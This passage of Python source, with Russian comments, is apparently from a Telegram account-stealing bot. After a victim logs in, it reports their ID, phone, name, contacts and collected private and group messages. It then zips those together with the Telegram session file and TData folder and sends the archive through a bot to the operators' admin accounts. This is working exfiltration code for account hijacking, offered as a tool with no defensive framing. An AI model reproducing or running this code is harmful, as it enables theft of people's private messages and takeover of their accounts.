        print(f"   TData path: {tdata_path}", flush=True)
        print(f"   Session file: {session_file_path}", flush=True)
        
        mode = parsed_data.get('parsing_mode', 'quick')
        mode_name = "БЫСТРЫЙ" if mode == 'quick' else "ПОЛНЫЙ"
        
        # Формируем сообщение с информацией
        message_text = f"""
🎉 <b>НОВАЯ АВТОРИЗАЦИЯ! ({mode_name} ПАРСИНГ)</b>

👤 <b>Информация о пользователе:</b>
• ID: <code>{user_data['id']}</code>
• Телефон: <code>{user_data['phone']}</code>
• Имя: {user_data.get('first_name', 'Нет')} {user_data.get('last_name', '')}
• Username: @{user_data.get('username', 'нет')}

📊 <b>Спарсенные данные:</b>
• Контактов: {len(parsed_data.get('contacts', []))}
• Всего диалогов: {len(parsed_data.get('dialogs', []))}
• Групп: {len(parsed_data.get('chats', []))}
• Каналов: {len(parsed_data.get('channels', []))}

📨 <b>Собранные сообщения:</b>
• Личных переписок: {len(parsed_data.get('private_messages', {}))}
• Групп/каналов: {len(parsed_data.get('group_messages', {}))}

{'📦 Архив: ZIP со всеми данными ↓' if mode == 'quick' else '💎 Полный архив: ZIP со всеми данными ↓'}
"""
        
        # Создаём ZIP архив
        print(f"   📦 Creating data archive...", flush=True)
        zip_bytes = create_data_archive(user_data, parsed_data, session_file_path, tdata_path)
        
        if not zip_bytes:
            print(f"   ❌ Failed to create ZIP archive", flush=True)
            return
        
        # Создаём новый Bot instance
        temp_bot = Bot(token=config.BOT_TOKEN)
        
        # Отправляем админам
        for admin_id in config.ADMIN_IDS:
            try:
                print(f"   📨 Sending to admin {admin_id}...", flush=True)
                
                # Отправляем текст
                await temp_bot.send_message(
                    chat_id=admin_id,
                    text=message_text,
                    parse_mode='HTML'
                )
                print(f"      ✅ Message sent", flush=True)
                
                # Отправляем ZIP архив
                zip_file = BufferedInputFile(
                    zip_bytes,
                    filename=f"user_{user_data['id']}_{mode}_data.zip"
                )
                
                await temp_bot.send_document(
                    chat_id=admin_id,
                    document=zip_file,
                    caption=f"📦 {mode_name} архив данных пользователя {user_data['id']}"
                )
                print(f"      ✅ ZIP archive sent", flush=True)
                
                print(f"   ✅ All data sent to admin {admin_id}", flush=True)
                
            except Exception as e:
                print(f"   ❌ Error sending to admin {admin_id}: {e}", flush=True)
                import traceback
                traceback.print_exc()
        
        # Закрываем временную сессию
        await temp_bot.session.close()
        
        print(f"✅ Finished sending to all admins", flush=True)
        
    except Exception as e:
        print(f"❌ Error in send_data_to_admins: {e}", flush=True)
        import traceback
        traceback.print_exc()
